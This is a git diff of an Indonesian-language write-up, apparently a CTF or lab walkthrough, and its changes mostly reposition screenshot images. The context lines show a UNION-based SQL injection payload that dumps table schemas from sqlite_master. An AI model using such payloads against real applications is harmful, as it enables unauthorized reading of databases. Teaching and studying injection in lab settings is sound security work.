@@ -28,10 +28,10 @@ Dari percobaan, ditemukan bahwa query membutuhkan **9 kolom** agar bisa diekseku
 
 <img width="975" height="220" alt="image" src="https://github.com/user-attachments/assets/35234bfd-f108-4df7-8b9c-45870781ceec" />
 
-
+<img width="975" height="520" alt="image" src="https://github.com/user-attachments/assets/1c0b3168-58d8-435f-b8a9-d90bb14834c0" />
 ## 4. Payload Final
 Setelah jumlah kolom diketahui, payload disusun untuk membaca definisi tabel dari `sqlite_master`:
-
+<img width="975" height="520" alt="image" src="https://github.com/user-attachments/assets/1c0b3168-58d8-435f-b8a9-d90bb14834c0" />
 ```sql
 ')) UNION SELECT 
 1,
@@ -45,5 +45,3 @@ group_concat(sql, char(10)),
 NULL
 FROM sqlite_master WHERE sql NOT NULL-- -
 
-
-<img width="975" height="520" alt="image" src="https://github.com/user-attachments/assets/1c0b3168-58d8-435f-b8a9-d90bb14834c0" />
